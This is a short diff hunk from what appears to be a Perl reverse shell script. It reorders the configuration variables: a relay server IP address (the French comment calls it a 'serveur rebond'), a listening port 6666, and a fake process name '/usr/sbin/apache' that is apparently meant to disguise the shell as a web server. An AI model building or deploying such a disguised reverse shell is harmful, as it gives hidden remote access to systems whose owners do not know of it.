@@ -6,8 +6,8 @@ use IO::Socket;
 use FileHandle;
 
 #notre adresse ip publique qui sera en fait l'adresse d'un serveur rebond
-my $publicip = "192.168.0.23";
 my $shellsock;
+my $publicip           = "192.168.0.23";
 my $fakeprocess        = "/usr/sbin/apache";
 my $reverse_shell_port = 6666;
 
